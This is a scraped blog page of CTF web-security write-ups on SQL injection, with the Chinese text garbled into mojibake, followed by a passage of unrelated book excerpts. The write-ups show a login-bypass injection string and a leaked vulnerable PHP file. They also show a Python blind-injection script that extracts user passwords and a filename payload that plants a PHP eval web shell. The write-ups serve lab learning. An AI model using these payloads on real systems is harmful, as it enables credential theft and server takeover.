<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#CISCN2019-easyweb">https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#CISCN2019-easyweb</a></p>
<p><strong>å¤±è´¥çš„å°è¯•</strong></p>
<p>æ‰“å¼€ç½‘é¡µï¼Œæ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢</p>
<p>å°è¯•ä¸€äº›ç®€å•æ³¨å…¥ï¼Œå¤±è´¥</p>
<p>è®¿é—®robots.txtï¼Œæç¤ºæ¯ä¸ªphpæ–‡ä»¶æœ‰bak</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: *.php.bak</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯index.phpçš„bakå‡ºä¸æ¥</p>
<p>åœ¨firefoxè°ƒè¯•é¢æ¿çš„ç½‘ç»œä¸­ï¼Œå‘ç°ç™»å½•é¡µé¢çš„æ•°æ®æ˜¯äº¤ç»™user.phpçš„ï¼Œä½†æ˜¯å•ç‹¬è®¿é—®user.phpæ˜¯æ²¡æœ‰ç»“æœçš„</p>
<p>åœ¨ç™»å½•ç•Œé¢ï¼Œå°è¯•è¾“å…¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">username: admin&#39; or &#39;1&#39;&#x3D;&#39;1 #</span><br><span class="line">password: 123</span><br><span class="line"></span><br><span class="line">username: 123</span><br><span class="line">password: 456</span><br></pre></td></tr></table></figure>
<p>å‘ç°ä¸¤è€…è¿”å›çš„å›¾ç‰‡ä¸ä¸€æ ·</p>
<p>å†æ¬¡æ‰“å¼€é¡µé¢æŸ¥çœ‹å™¨ï¼Œå‘ç°imgçš„æ ‡ç­¾æ˜¯è¿™æ ·çš„</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;image.php?id&#x3D;2&quot; width&#x3D;&quot;200&quot; height&#x3D;&quot;200&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>ç›´æ¥è®¿é—®image.php?id=1ï¼Œæ˜¯å¯ä»¥è®¿é—®çš„</p>
<p><strong>æ­£ç¡®wp</strong></p>
<p>ä¸‹é¢å‚è€ƒåˆ«äººçš„wp</p>
<p>ä½¿ç”¨dirmapæ‰«æå‡ºæœ‰image.php.bakæ–‡ä»¶ï¼ˆè¿™ä¸ªä¸çŸ¥é“å’‹æ“ä½œï¼Œä¸€ç›´å› ä¸ºtoo many requestæ— æ³•å¾—å‡ºæ­£ç¡®ç»“æœ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># image.php.bak</span></span><br><span class="line">&lt;ï»¿?php</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$path</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=addslashes(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=addslashes(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$row</span>=mysqli_fetch_array(<span class="variable">$result</span>,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span>=<span class="string">&quot;./&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>];</span><br><span class="line">header(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line">readfile(<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure>
<p>å‘ç°ï¼Œè¯­å¥ä¸ºâ€select * from images where id=â€™{$id}â€˜ or path=â€™{$path}â€™â€</p>
<p>å‘ç°ï¼Œä½¿ç”¨äº†addslasheså’Œstr_replace</p>
<p>â€‹    æ­¤å¤„ï¼Œaddslashesæ˜¯åœ¨æ–œæ \å‰å†æ·»åŠ ä¸€ä¸ªæ–œæ è¿›è¡Œè½¬è¯‘ï¼›è€Œstr_replaceæ˜¯æŠŠé‚£å››ä¸ªå­—ç¬¦æ›¿æ¢ä¸ºç©º</p>
<p>è€Œç›®çš„æ˜¯ä¼ å…¥çš„idå€¼æœ€ç»ˆä¸º/ï¼Œä»è€Œè¿‡æ»¤æ‰ä¹‹åçš„å•å¼•å·</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;&#39;&#x2F;&#39; and path&#x3D;&#39;payload#&#39;</span><br></pre></td></tr></table></figure>
<p>å› æ­¤idä¼ å…¥//0</p>
<p>ä¹‹åä¸å†™äº†ï¼ŒæŠ„wp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;eff1faa0-512a-48cd-afc2-155bb1119cb2.node3.buuoj.cn&#x2F;image.php?id&#x3D;\\0&amp;path&#x3D;&quot;</span><br><span class="line">#payload &#x3D; &quot;or id&#x3D;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span><br><span class="line">#payload &#x3D; &quot;or id&#x3D;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span><br><span class="line">#payload &#x3D; &quot;or id&#x3D;if(ascii(substr((select username from users),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span><br><span class="line">payload &#x3D; &quot;or id&#x3D;if(ascii(substr((select password from users),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span><br><span class="line">flag &#x3D; &quot;JFIF&quot;</span><br><span class="line">result &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(1, 100):</span><br><span class="line">    sleep(0.5)</span><br><span class="line">    low &#x3D; 32</span><br><span class="line">    high &#x3D; 127</span><br><span class="line">    while high &gt; low:</span><br><span class="line">        mid &#x3D; (high + low) &gt;&gt; 1</span><br><span class="line">        response &#x3D; requests.get(url + payload.format(i, mid))</span><br><span class="line">        if flag in response.text:</span><br><span class="line">            low &#x3D; mid + 1</span><br><span class="line">        else:</span><br><span class="line">            high &#x3D; mid</span><br><span class="line"></span><br><span class="line">    if low !&#x3D; 32:</span><br><span class="line">        result +&#x3D; chr(low)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a59e57715afd21f67dbc</span><br></pre></td></tr></table></figure>
<p>wpè¯´ç™»å½•åæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ç»•è¿‡ï¼Œå¯ä½¿ç”¨çŸ­æ ‡ç­¾ç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&lt;?&#x3D;@eval($_POST([&#39;a&#39;]));?&gt;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸€æ­¥ä¸€ç›´æ²¡è¿ä¸Šï¼Œè·³è¿‡</p>
<h1 id="é¢œå€¼æˆç»©æŸ¥è¯¢"><a href="#é¢œå€¼æˆç»©æŸ¥è¯¢" class="headerlink" title="é¢œå€¼æˆç»©æŸ¥è¯¢"></a>é¢œå€¼æˆç»©æŸ¥è¯¢</h1><p>æ¥æºï¼šWUSTCTF2020</p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#CISCN2019-easyweb">https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#CISCN2019-easyweb</a></p>
<p><strong>é”™è¯¯å°è¯•</strong></p>
<p>å•å¼•å·æ³¨å…¥ï¼ŒåŒå¼•å·æ³¨å…¥ï¼Œæ‰«æç›®å½•ï¼ŒæŸ¥çœ‹æºç ï¼Œrobots.txt</p>
<p><strong>æ­£ç¡®æ–¹æ³•</strong></p>
<p>ä¸éœ€è¦å•å¼•å·æ³¨å…¥å•Šç›´æ¥å†™è¯­å¥</p>
<p><img src=".%5Cpic%5CCTF-Web-SQL%E6%B3%A8%E5%85%A5-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2.png" alt="CTF-Web-SQLæ³¨å…¥-é¢œå€¼æˆç»©æŸ¥è¯¢"></p>
<p>åé¢çš„è·³è¿‡ï¼Œå°±æ˜¯æ­£å¸¸çš„é‚£ç§å¸ƒå°”ç›²æ³¨</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/01/20/CTF-Web-SQL%E6%B3%A8%E5%85%A5/" data-id="ckkdrz0z40006ugus6naj9ngh" data-title="CTF-Web-SQLæ³¨å…¥" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-æ‘˜æŠ„-ã€Šé€šå¾€å¥´å½¹ä¹‹è·¯ã€‹" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/01/19/%E6%91%98%E6%8A%84-%E3%80%8A%E9%80%9A%E5%BE%80%E5%A5%B4%E5%BD%B9%E4%B9%8B%E8%B7%AF%E3%80%8B/" class="article-date">
  <time class="dt-published" datetime="2021-01-19T13:07:26.000Z" itemprop="datePublished">2021-01-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/01/19/%E6%91%98%E6%8A%84-%E3%80%8A%E9%80%9A%E5%BE%80%E5%A5%B4%E5%BD%B9%E4%B9%8B%E8%B7%AF%E3%80%8B/">æ‘˜æŠ„-ã€Šé€šå¾€å¥´å½¹ä¹‹è·¯ã€‹</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <ol>
<li>å½“â€œç¤¾ä¼šâ€â€œå…¨ä½“çš„åˆ©ç›Šâ€â€œæœ€å¤§å¤šæ•°äººçš„æœ€å¤§åˆ©ç›Šâ€æˆä¸ºå›½å®¶è¡ŒåŠ¨çš„å‹å€’ä¸€åˆ‡çš„æ ‡å‡†æ—¶ï¼Œæ²¡æœ‰ä¸€ä¸ªäººèƒ½å¤Ÿç»™ä»–è‡ªå·±çš„ç”Ÿè®¡åšå‡ºè®¡åˆ’ã€‚å› ä¸ºï¼Œå¦‚æœâ€œç¤¾ä¼šâ€çš„åˆ©ç›Šæˆ–â€œæ™®éçš„ç¦åˆ©â€é«˜äºä¸€åˆ‡ï¼Œå›½å®¶â€œè®¡åˆ’ç€â€å¿…ç„¶è¦çªƒæ®èƒ½å¤Ÿå é¢†ç»æµä½“ç³»çš„ä»»ä½•é¢†åŸŸçš„å¤§æƒã€‚</li>
<li>å¦‚æœä¸ªäººçš„æƒåˆ©æˆä¸ºé˜»ç¢ï¼Œä¸ªäººçš„æƒåˆ©å°±å¿…é¡»å»æ‰ã€‚ä¸ç¨³å®šçš„æœ€ç»ˆç»“æœï¼Œä¸æ˜¯å†…æˆ˜å°±æ˜¯é˜²æ­¢å†…æˆ˜çš„ç‹¬è£åˆ¶åº¦ã€‚å¾ˆå°‘æœ‰ä»€ä¹ˆå‘ç°æ¯”æ­éœ²æ€æƒ³æ ¹æºçš„å‘ç°æ›´ä¸ºæƒ¹äººæ„¤æ€’äº†ã€‚</li>
<li>åœ¨è¿‘ä»£æ¬§æ´²å†å²çš„æ•´ä¸ªæ—¶æœŸä¸­ï¼Œç¤¾ä¼šå‘å±•çš„æ€»æ–¹å‘ï¼Œæ˜¯ä½¿ä¸ªäººä»ä»–ä»äº‹æ—¥å¸¸æ´»åŠ¨æ—¶æŸç¼šä»–çš„é‚£äº›ä¹ æƒ¯çš„å’Œæˆè§„çš„ç¾ç»Šä¸­è§£æ”¾å‡ºæ¥ã€‚</li>
<li>è¥¿æ–¹çš„é•¿å¹´ç—¼ç–¾ï¼Œä¸ªä½“å¯¹ç§å±çš„åæŠ—ï¼Œå®é™…æ˜¯å»ºæˆæˆ‘ä»¬æ–‡åŒ–çš„åŠ›é‡å¤§éƒ¨åˆ†æ–°æ€æƒ³ï¼Œå°¤å…¶æ˜¯shä¸»ä¹‰æ€æƒ³ï¼Œå¹¶éèµ·æºäºå¾·å›½ï¼Œä½†æ˜¯å®ƒä»¬æ˜¯åœ¨å¾·å›½å®Œæˆçš„ã€‚å¸¸å¸¸ä½¿ä¸€ä¸ªå›½å®¶å˜æˆåœ°ç‹±çš„ï¼Œæ­£å¥½æ˜¯äººä»¬è¯•å›¾æŠŠå›½å®¶å˜æˆå¤©å ‚çš„ä¸œè¥¿ã€‚å¥ å®šç°ä»£shä¸»ä¹‰åŸºç¡€çš„æ³•å›½ä½œå®¶ä»¬å¹¶ä¸ä¼šæ€€ç–‘ï¼Œä»–ä»¬çš„ç†æƒ³åªæœ‰é€šè¿‡å¼ºæœ‰åŠ›çš„ç‹¬è£æ”¿åºœæ‰å¯èƒ½ä»˜è¯¸å®ç°ã€‚</li>
<li>æ°‘ä¸»ä¸»ä¹‰æ‰©å±•ä¸ªäººè‡ªç”±çš„èŒƒå›´ï¼Œè€Œshä¸»ä¹‰åˆ™å¯¹å®ƒåŠ ä»¥é™åˆ¶ã€‚æ°‘ä¸»ä¸»ä¹‰èµ‹äºˆæ¯ä¸ªäººä»¥å°½å¯èƒ½å¤šçš„ä»·å€¼ï¼Œè€Œshä¸»ä¹‰åˆ™æŠŠæ¯ä¸€ä¸ªäººå¼„æˆä»…ä»…æ˜¯ä¸€ä¸ªå·¥å…·ï¼Œä¸€ä¸ªæ•°å­—ã€‚æ°‘ä¸»ä¸»ä¹‰å’Œshä¸»ä¹‰é™¤äº†â€œå¹³ç­‰â€ä¸€è¯å¤–ï¼Œæ²¡æœ‰å…±åŒè¯­è¨€ã€‚ä½†è¯·æ³¨æ„è¿™ä¸ªå·®åˆ«ï¼šæ°‘ä¸»ä¸»ä¹‰ä»è‡ªç”±ä¸­å¯»æ‰¾å¹³ç­‰ï¼Œè€Œshä¸»ä¹‰åˆ™ä»æŠ‘åˆ¶å’Œå¥´å½¹ä¸­å¯»æ±‚å¹³ç­‰ã€‚è¿™ç§æ„ä¹‰çš„è‡ªç”±ï¼Œåªèƒ½æ˜¯æƒåŠ›å’Œè´¢å¯Œçš„å¦ä¸€ä¸ªåè¯ã€‚æ–¯å¤§æ—ä¸»ä¹‰å°±æ˜¯shä¸»ä¹‰ï¼Œå®ƒæ˜¯å›½æœ‰åŒ–å’Œé›†ä½“åŒ–çš„è™½ç„¶æ˜¯ä¸å¯é¢„æ–™çš„ã€ç„¶è€Œå´æ˜¯ä¸å¯é¿å…çš„æ”¿æ²»é™„å±ç‰©ï¼Œè€Œè¿™ä¸¤è€…éƒ½æ˜¯æ–¯å¤§æ—èµ–ä»¥å»ºç«‹ä¸€ä¸ªæ²¡æœ‰é˜¶çº§çš„ç¤¾ä¼šçš„è®¡åˆ’ä¸­çš„ä¸€éƒ¨åˆ†ã€‚shä¸»ä¹‰è‚¯å®šä¼šè¯å®ï¼Œè‡³å°‘åœ¨å…¶å¼€å§‹é˜¶æ®µï¼Œä¸æ˜¯é€šå‘è‡ªç”±çš„é“è·¯ï¼Œè€Œæ˜¯é€šå‘ç‹¬è£å’Œåç‹¬è£ã€é€šå‘æœ€æ®‹é…·çš„å†…æˆ˜çš„é“è·¯ã€‚ç”¨æ°‘ä¸»æ‰‹æ®µæ¥å®ç°å’Œç»´æŒçš„shä¸»ä¹‰ï¼Œä¼¼ä¹åªæ˜¯ä¹Œæ‰˜é‚¦é‡Œæ‰æœ‰çš„ä¸œè¥¿ã€‚</li>
<li>ç”¨æ¥è¯æ˜è®¡åˆ’çš„ä¸å¯é¿å…æ€§çš„å„ç§è®ºæ®ä¸­ï¼Œæœ€å¸¸å¬åˆ°çš„ä¸€ç§è¯´æ³•ï¼Œæ˜¯æŠ€æœ¯çš„æ”¹å˜å·²ç»åœ¨æ„ˆæ¥æ„ˆå¤šçš„éƒ¨é—¨ä¸­ä½¿ç«äº‰æˆä¸ºä¸å¯èƒ½ï¼Œè€Œå¯¹æˆ‘ä»¬æ¥è¯´ï¼Œå”¯ä¸€çš„é€‰æ‹©æ˜¯ç”±ç§äººå„æ–­ç»„ç»‡æ§åˆ¶ç”Ÿäº§è¿˜æ˜¯æ”¿åºœç®¡ç†ç”Ÿäº§ã€‚ä»»ä½•æ›¾åœ¨æœ‰åçš„å¾·å›½å…¬è·¯ä¸Šé©±è½¦è€Œè¿‡ï¼Œå‘ç°è·¯ä¸Šçš„è¿è¾“é‡è¾ƒè‹±å›½æ¬¡ç­‰çš„å…¬è·¯è¿˜è¦å°‘çš„äººï¼Œä»–ä»¬ä¸ä¼šæ€€ç–‘ï¼Œå°±å’Œå¹³çš„ç›®çš„è€Œè¨€ï¼Œå®ƒä»¬æ˜¯æ²¡æœ‰ä»€ä¹ˆåˆç†æ ¹æ®çš„ã€‚ç”±äºæˆ‘ä»¬æƒ³è±¡èƒ½åŠ›çš„é™åˆ¶ï¼Œæˆ‘ä»¬çš„ä»·å€¼å°ºåº¦æ‰€èƒ½åŒ…æ‹¬çš„åªæ˜¯å…¨ç¤¾ä¼šéœ€è¦çš„ä¸€éƒ¨åˆ†ã€‚</li>
<li>ä¸ªäººä¸»ä¹‰è€…å¾—å‡ºç»“è®ºï¼Œåœ¨é™å®šçš„èŒƒå›´å†…ï¼Œåº”å½“è®©ä¸ªäººéµå¾ªå®ƒä»¬è‡ªå·±çš„ï¼ˆè€Œä¸æ˜¯åˆ«äººçš„ï¼‰ä»·å€¼å’Œåçˆ±ï¼Œå¹¶ä¸”åœ¨è¿™ä¸ªé¢†åŸŸå†…ï¼Œä¸ªäººçš„ç›®æ ‡ä½“ç³»åº”å½“é«˜äºä¸€åˆ‡ï¼Œä¸å—ä»–äººä»»ä½•å‘½ä»¤çš„çº¦æŸã€‚æ‰€è°“â€œç¤¾ä¼šç›®æ ‡â€åªä¸è¿‡æ˜¯è®¸å¤šä¸ªäººçš„ç›¸åŒçš„ç›®æ ‡ï¼Œæˆ–è€…è¯´ä¸ªäººä¸ºäº†æŠ¥ç­”å®ƒä»¬åœ¨æ»¡è¶³è‡ªèº«æ¬²æœ›æ—¶æ‰€å¾—åˆ°çš„å¸®åŠ©è€Œæ„¿æ„ä¸ºå…¶å®ç°è´¡çŒ®åŠ›é‡çš„é‚£ç§ç›®æ ‡ã€‚äººæ°‘å¯èƒ½å·²ç»åŒæ„é‡‡å–ä¸€ç§æœ‰é¢†å¯¼çš„ç»æµåˆ¶åº¦ï¼Œå› ä¸ºä»–ä»¬å·²ç»ç¡®ä¿¡å®ƒä¼šäº§ç”Ÿå·¨å¤§çš„ç¹è£ã€‚å¦‚æœè¦ä½¿å¤§è§„æ¨¡çš„é›†ä¸­è®¡åˆ’æˆä¸ºå¯èƒ½ï¼Œç‹¬è£åˆ¶åº¦æœ¬èº«æ˜¯å¿…ä¸å¯å°‘çš„ã€‚</li>
<li>æ²¡æœ‰ç†ç”±ç›¸ä¿¡ï¼Œåªè¦æƒåŠ›æ˜¯ç»è¿‡æ°‘ä¸»ç¨‹åºæˆäºˆçš„ï¼Œå®ƒå°±ä¸å¯èƒ½æ˜¯ä¸“æ¨ªçš„ã€‚</li>
<li>å¦‚æœæ‰€æœ‰æŠ¥é…¬ï¼Œä¸æ˜¯é‡‡å–æä¾›è´§å¸çš„å½¢å¼ï¼Œè€Œæ˜¯é‡‡å–æä¾›å…¬å¼€è£èª‰æˆ–ç‰¹æƒã€å‡Œé©¾åˆ«äººä¹‹ä¸Šçš„æœ‰æƒåŠ›çš„ä½ç½®ã€æˆ–è¾ƒå¥½çš„ä½å®…æˆ–è¾ƒå¥½çš„é£Ÿç‰©ã€æ—…è¡Œæˆ–å—æ•™è‚²çš„æœºä¼šç­‰å½¢å¼ï¼Œè¿™åªä¸è¿‡æ„å‘³ç€ï¼Œæ¥å—æŠ¥é…¬çš„äººä¸å†èƒ½è‡ªè¡Œé€‰æ‹©ï¼Œè€Œå†³å®šæŠ¥é…¬çš„é‚£ä¸ªäººï¼Œä¸ä»…å†³å®šæŠ¥é…¬çš„å¤§å°ï¼Œè€Œä¸”ä¹Ÿå†³å®šäº†äº«ç”¨æŠ¥é…¬çš„ç‰¹å®šå½¢å¼ã€‚</li>
<li>æ²¡æœ‰æ¯”çŸ¥é“æˆ‘ä»¬æ€ä¹ˆåŠªåŠ›ä¹Ÿä¸èƒ½ä½¿æƒ…å†µæ”¹å˜è¿™ä»¶äº‹ï¼Œæ›´ä½¿ä¸€ä¸ªäººçš„å¤„å¢ƒå˜å¾—ä»¤äººéš¾ä»¥å¿å—å¾—äº†ï¼›çºµä½¿æˆ‘ä»¬ä»æ¥æ²¡æœ‰ç²¾ç¥ä¸Šçš„åŠ›é‡å»åšå‡ºå¿…è¦çš„ç‰ºç‰²ï¼Œä½†åªè¦çŸ¥é“è¿™ä¸€ç‚¹ï¼Œå³åªè¦æˆ‘ä»¬åŠªåŠ›å¥‹æ–—å°±èƒ½æ‘†è„±è¿™ç§å¤„å¢ƒï¼Œå°±ä¼šä½¿è®¸å¤šä»¤äººéš¾ä»¥å¿å—çš„å¤„å¢ƒæˆä¸ºå¯å®¹å¿çš„ã€‚</li>
<li>ç«äº‰å’Œäº‰è®®å¾ˆå°‘æœ‰å…±åŒä¹‹å¤„ï¼Œä½†å€¼å¾—åŒæ ·ç§°é“çš„ä¸€ç‚¹ï¼Œä¹ƒæ˜¯ä¸¤è€…ä¿±ä¸å¾‡ç§ã€‚</li>
<li>ä¸€ä¸ªå¯Œäººå¾—åŠ¿çš„ä¸–ç•Œä»æ¯”ä¸€ä¸ªåªæœ‰å¾—åŠ¿æ‰èƒ½è‡´å¯Œçš„ä¸–ç•Œè¦å¥½äº›ã€‚</li>
<li>æˆ‘ä»¬å¯¹äºæ”¹è¿›æˆ‘ä»¬åœ°ä½æ‰€åšçš„ä¸€åˆ‡åŠªåŠ›çš„ç›®æ ‡ï¼Œå°†ä¸åœ¨äºé¢„æµ‹æˆ‘ä»¬æ— æ³•æ§åˆ¶çš„é‚£äº›æƒ…å†µï¼Œå’Œå¯¹é‚£äº›æƒ…å†µå°½é‡åšçš„å‡†å¤‡ï¼Œè€Œåœ¨äºè®¾æ³•ä½¿æ¡æœ‰å…¨æƒè€…å¯¹æˆ‘ä»¬æœ‰å¥½æ„Ÿã€‚ä¸€åˆ‡æ”¿åºœçš„é—®é¢˜å°±æ˜¯â€œè°å¾—åˆ°ä»€ä¹ˆï¼Œä½•æ—¶å¾—åˆ°ï¼Œå¦‚ä½•å¾—åˆ°â€çš„é—®é¢˜ã€‚çŸ¥è¯†ä¸èƒ½å¤Ÿåˆ›é€ æ–°çš„ä¼¦ç†çš„ä»·å€¼æ ‡å‡†ã€‚</li>
<li>åœ¨ä¸€ä¸ªæ”¿åºœæ˜¯å”¯ä¸€çš„é›‡ä¸»çš„å›½å®¶é‡Œï¼ŒåæŠ—å°±ç­‰äºæ…¢æ…¢åœ°é¥¿æ­»ã€‚â€œä¸åŠ³åŠ¨è€…ä¸å¾—é£Ÿâ€è¿™ä¸ªæ—§çš„åŸåˆ™ï¼Œå·²ç”±â€œä¸æœä»è€…ä¸å¾—é£Ÿâ€è¿™ä¸ªæ–°çš„åŸåˆ™æ‰€ä»£æ›¿ã€‚ï¼ˆæ‰˜æ´›æ–¯åŸºï¼‰</li>
<li>æŠŠé›‡ä½£ä¸€ç™¾ä¸ªäººè¯´æˆæ˜¯å‰¥å‰Šï¼ŒæŠŠæŒ‡æŒ¥ä¸€ç™¾ä¸ªäººè¯´æˆæ˜¯å…‰è£ã€‚åªæœ‰èŠ±ä»£ä»·æ‰èƒ½å¾—åˆ°è‡ªç”±ï¼Œå¹¶ä¸”å°±æˆ‘ä»¬ä¸ªäººæ¥è¯´ï¼Œæˆ‘ä»¬å¿…é¡»å‡†å¤‡ä½œå‡ºé‡å¤§çš„ç‰©è´¨ç‰ºç‰²ï¼Œä»¥ç»´æŠ¤æˆ‘ä»¬çš„è‡ªç”±ã€‚</li>
<li>é‚£äº›æ„¿æ„æ”¾å¼ƒæ ¹æœ¬çš„è‡ªç”±æ¥æ¢å¾—å°‘è®¸çš„æš‚æ—¶å®‰å…¨çš„äººï¼Œæ—¢ä¸é…å¾—åˆ°è‡ªç”±ï¼Œä¹Ÿä¸é…å¾—åˆ°å®‰å…¨ï¼ˆå¯Œå…°å…‹æ—ï¼‰</li>
<li>æƒåˆ©æ»‹ç”Ÿè…åŒ–ï¼Œç»å¯¹çš„æƒåˆ©åˆ™ç»å¯¹çš„ä¼šè…åŒ–ï¼ˆé˜¿å…‹é¡¿çˆµå£«ï¼‰</li>
<li>èƒ½å¦æŠŠææƒä¸»ä¹‰åˆ¶åº¦å¼ºåŠ äºå…¨ä½“äººæ°‘ï¼Œå–å†³äºé¢†å¯¼äººæ˜¯å¦èƒ½å¤Ÿé¦–å…ˆæ”¶ç½—ä¸€æ‰¹äººåœ¨ä»–çš„èº«è¾¹ï¼Œè¿™äº›äººå‡†å¤‡å¿—æ„¿çš„æœä»ä¸€ä¸ªçºªå¾‹ï¼Œå³ä»–ä»¬è¦ç”¨å¼ºåŠ›åŠ åœ¨å…¶ä½™äººèº«ä¸Šçš„é‚£ä¸ªææƒä¸»ä¹‰çš„çºªå¾‹ã€‚æ—§çš„å„shä¸»ä¹‰å…šæ´¾å—åˆ°äº†ä»–ä»¬çš„æ°‘ä¸»ç†æƒ³çš„æ‹˜æŸï¼Œä»–ä»¬æ²¡æœ‰å…·å¤‡æ‰§è¡Œä»–ä»¬æ‰€é€‰æ‹©çš„ä»»åŠ¡æ‰€éœ€è¦çš„æ®‹å¿ã€‚</li>
